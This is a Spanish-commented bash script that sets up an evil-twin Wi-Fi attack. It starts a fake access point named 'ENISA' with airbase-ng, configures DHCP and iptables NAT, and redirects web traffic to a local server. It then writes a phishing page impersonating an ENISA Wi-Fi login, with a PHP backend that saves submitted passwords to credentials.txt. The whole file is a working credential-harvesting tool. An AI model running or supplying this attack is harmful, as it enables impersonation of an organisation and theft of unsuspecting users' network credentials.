#!/bin/bash

# Inicio tarjeta en modo monitor y matar procesos conflictivos (ojo con esto, importante!)
airmon-ng check kill
airmon-ng start wlan0

# Configuración DHCP
echo "authoritative;" > /etc/dhcpd.conf
echo "default-lease-time 600;" >> /etc/dhcpd.conf
echo "max-lease-time 7200;" >> /etc/dhcpd.conf
echo "subnet 192.168.2.0 netmask 255.255.255.0 {" >> /etc/dhcpd.conf
echo "option subnet-mask 255.255.255.0;" >> /etc/dhcpd.conf
echo "option broadcast-address 192.168.2.255;" >> /etc/dhcpd.conf
echo "option routers 192.168.2.1;" >> /etc/dhcpd.conf
echo "option domain-name-servers 8.8.8.8;" >> /etc/dhcpd.conf
echo "range 192.168.2.10 192.168.2.100;" >> /etc/dhcpd.conf
echo "}" >> /etc/dhcpd.conf

# Inicio el punto de acceso falso
xterm -e "airbase-ng --essid ENISA -c 6 -P wlan0" &

# Espero 10 segundos para que el punto de acceso falso se inicie correctamente
sleep 10

# Configuro interfaz virtual cableada (la crea airbase-ng) con su direccionamiento IP y enruto todo el tráfico por ella
ifconfig at0 192.168.2.1 netmask 255.255.255.0
route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
echo 1 > /proc/sys/net/ipv4/ip_forward

# Borrado y creación de reglas IPTables para el enrutado de paquetes desde la interfaz virtual cableada a Internet
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT

# Redirección de paquetes que vayan al puerto 80 y 443 al servidor falso para captura de credenciales
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.252:80
#iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 82.223.222.235:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# Inicio del proceso DHCP enlazado a interfaz cableada virtual para que los clientes Wi-Fi reciban IP dinámica
sleep 5
dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0

# Creación de página maliciosa para pedir credenciales (frontal)
echo "<!DOCTYPE html>" > /var/www/html/index.html
echo "<meta charset=\"UTF-8\">" >> /var/www/html/index.html
echo "<html>" >> /var/www/html/index.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> /var/www/html/index.html
echo "<center><h2> Sesión Wi-Fi en ENISA expirada <br><br> Por favor, inicie sesión de nuevo </h2></center><center>" >> /var/www/html/index.html
echo "<form method=\"POST\" action=\"login.php\"><label> </label>" >> /var/www/html/index.html
echo "<br><label>Contraseña Wi-Fi ENISA: </label><input type=\"password\" name=\"password\" length=64><br><br>" >> /var/www/html/index.html
echo "<input value=\"Acceder\" type=\"submit\"></form>" >> /var/www/html/index.html
echo "<br></br>" >> /var/www/html/index.html
echo "<img src=\"enisa-logo.png\"/>" >> /var/www/html/index.html
echo "</center><body>" >> /var/www/html/index.html
echo "</html>" >> /var/www/html/index.html

# Creación de página maliciosa para pedir credenciales (backend)
echo "<?php" > /var/www/html/login.php
echo "file_put_contents(\"credentials.txt\", \" Pass: \" . \$_POST['password'] . \"\\\n\", FILE_APPEND);" >> /var/www/html/login.php
echo "header('Location: https://www.enisa.es');" >> /var/www/html/login.php
echo "exit();" >> /var/www/html/login.php
echo "?>" >> /var/www/html/login.php

# Cambio de poseedor de carpeta para permitir escritura de credenciales capturadas
chown -R www-data:www-data /var/www/html

# Inicio de Apache
service apache2 start
